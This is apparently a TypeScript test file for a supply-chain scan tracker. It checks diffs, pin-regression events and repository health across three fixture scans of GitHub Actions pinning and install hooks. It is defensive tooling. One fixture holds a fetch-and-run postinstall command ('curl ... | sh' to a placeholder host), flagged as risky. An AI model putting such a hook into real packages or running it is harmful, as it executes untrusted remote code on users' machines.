/**
 * Store, diff, and health tests over imported fixture reports.
 *
 * Scenario (the tj-actions shape in miniature): scan 1 has a pinned
 * action and no hooks of interest; scan 2 moves the action back to a
 * mutable tag (pin regression) and adds a hookcheck dropper; scan 3
 * removes the dropper again. The diff, the ref event, the tracked
 * statuses, and the mean time open must all reflect exactly that.
 */
import { describe, it, beforeEach, afterEach } from "node:test";
import assert from "node:assert/strict";
import { mkdtempSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { Store } from "../src/store.js";
import { importReports } from "../src/ingest.js";
import { diffScans } from "../src/diff.js";
import { repoHealth } from "../src/report.js";

const SHA = "11bd71901bbe5b1630ceea73d27597364c9af683";
const ROOT = "/repos/demo";

const pinReport = (ref: string, classification: string, verdict: string) => ({
  path: ROOT,
  verdict,
  actions: [
    {
      workflow: `${ROOT}/.github/workflows/ci.yml`,
      line: 7,
      uses: `actions/checkout@${ref}`,
      action: "actions/checkout",
      ref,
      classification,
      ownerType: "official",
      rawLine: `      - uses: actions/checkout@${ref}`,
    },
  ],
  counts: { total: 1, pinned: classification === "PINNED" ? 1 : 0, mutable: 0, branch: 0, local: 0, official: 1, thirdParty: 0, docker: 0 },
  workflows: [`${ROOT}/.github/workflows/ci.yml`],
  checkedAt: "2026-01-01T00:00:00.000Z",
});

const hookReport = (withDropper: boolean) => ({
  path: ROOT,
  verdict: withDropper ? "COMPROMISED-PATTERN" : "CLEAN",
  findings: withDropper
    ? [
        {
          id: "package.json:postinstall",
          file: "package.json",
          source: "package.json",
          hook: "postinstall",
          command: "curl https://example.invalid/x.sh | sh",
          classification: "RISKY",
          rules: ["CURL-PIPE-SH"],
          evidence: "pipes a download into an interpreter",
        },
      ]
    : [],
  counts: { total: withDropper ? 1 : 0, safe: 0, risky: withDropper ? 1 : 0, unknown: 0 },
  warnings: [],
  scannedAt: "2026-01-01T00:00:00.000Z",
});

let dir: string;
let store: Store;

beforeEach(() => {
  dir = mkdtempSync(join(tmpdir(), "tracewatch-store-"));
  store = new Store(join(dir, "store"));
  importReports(store, {
    repo: "demo",
    path: ROOT,
    at: "2026-01-01T00:00:00.000Z",
    reports: [
      { tool: "actionpin", report: pinReport(SHA, "PINNED", "PINNED") },
      { tool: "hookcheck", report: hookReport(false) },
    ],
  });
  importReports(store, {
    repo: "demo",
    path: ROOT,
    at: "2026-01-03T00:00:00.000Z",
    reports: [
      { tool: "actionpin", report: pinReport("v4", "MUTABLE", "PARTIAL") },
      { tool: "hookcheck", report: hookReport(true) },
    ],
  });
  importReports(store, {
    repo: "demo",
    path: ROOT,
    at: "2026-01-05T00:00:00.000Z",
    reports: [
      { tool: "actionpin", report: pinReport("v4", "MUTABLE", "PARTIAL") },
      { tool: "hookcheck", report: hookReport(false) },
    ],
  });
});
afterEach(() => {
  rmSync(dir, { recursive: true, force: true });
});

describe("diff", () => {
  it("last-two diff: pin regression is a changed finding plus a ref event with both values", () => {
    const scans = store.scans("demo");
    const diff = diffScans(store, "demo", scans[0].scanId, scans[1].scanId);
    assert.equal(diff.added.length, 1);
    assert.equal(diff.added[0].tool, "hookcheck");
    assert.equal(diff.changed.length, 1);
    assert.equal(diff.refEvents.length, 1);
    const ev = diff.refEvents[0];
    assert.equal(ev.kind, "pin-regression");
    assert.equal(ev.oldRef, SHA);
    assert.equal(ev.newRef, "v4");
    assert.equal(ev.oldClassification, "PINNED");
    assert.equal(ev.newClassification, "MUTABLE");
    assert.ok(diff.changed[0].changes.some((c) => c.includes(`ref: ${SHA} -> v4`)));
    const moves = Object.fromEntries(diff.verdictMoves.map((m) => [m.tool, m]));
    assert.deepEqual([moves.actionpin.from, moves.actionpin.to], ["PINNED", "PARTIAL"]);
    assert.deepEqual([moves.hookcheck.from, moves.hookcheck.to], ["CLEAN", "COMPROMISED-PATTERN"]);
  });

  it("resolution: the dropper resolves in scan 3 and the default diff is scans 2 to 3", () => {
    const diff = diffScans(store, "demo");
    assert.equal(diff.resolved.length, 1);
    assert.equal(diff.resolved[0].tool, "hookcheck");
    assert.equal(diff.added.length, 0);
  });

  it("identical re-import diffs empty", () => {
    importReports(store, {
      repo: "demo",
      path: ROOT,
      at: "2026-01-06T00:00:00.000Z",
      reports: [
        { tool: "actionpin", report: pinReport("v4", "MUTABLE", "PARTIAL") },
        { tool: "hookcheck", report: hookReport(false) },
      ],
    });
    const diff = diffScans(store, "demo");
    assert.equal(diff.added.length + diff.resolved.length + diff.changed.length, 0);
    assert.equal(diff.unchangedCount, 1);
  });
});

describe("tracked findings and health", () => {
  it("statuses: action finding open and changed, dropper resolved with a 2 day open window", () => {
    const tracked = store.trackedFindings("demo");
    const dropper = tracked.find((t) => t.latest.tool === "hookcheck");
    assert.ok(dropper);
    assert.equal(dropper.status, "resolved");
    assert.equal(dropper.firstSeenAt, "2026-01-03T00:00:00.000Z");
    assert.equal(dropper.resolvedAt, "2026-01-05T00:00:00.000Z");
    const action = tracked.find((t) => t.latest.tool === "actionpin");
    assert.ok(action);
    assert.equal(action.status, "open");
    assert.equal(action.versions, 2);
  });

  it("health: trend, open counts, mean time open, ref events", () => {
    const h = repoHealth(store, "demo");
    assert.equal(h.scanCount, 3);
    assert.equal(h.open.total, 1);
    assert.equal(h.open.byTool.actionpin, 1);
    assert.equal(h.resolvedCount, 1);
    assert.equal(h.meanTimeOpenMs, 2 * 24 * 3600 * 1000);
    assert.equal(h.refEvents.length, 1);
    assert.equal(h.verdictTrend.length, 3);
    assert.equal(h.detections.count, 0);
  });

  it("determinism: identical store state renders identical diff and health 3 times", () => {
    const d1 = JSON.stringify(diffScans(store, "demo"));
    const d2 = JSON.stringify(diffScans(store, "demo"));
    const d3 = JSON.stringify(diffScans(store, "demo"));
    assert.equal(d1, d2);
    assert.equal(d2, d3);
    const h1 = JSON.stringify(repoHealth(store, "demo"));
    assert.equal(h1, JSON.stringify(repoHealth(store, "demo")));
  });

  it("findFinding resolves by prefix", () => {
    const tracked = store.trackedFindings("demo");
    const id = tracked[0].latest.findingId;
    const found = store.findFinding("demo", id.slice(0, 11));
    assert.equal(found?.latest.findingId, id);
  });
});
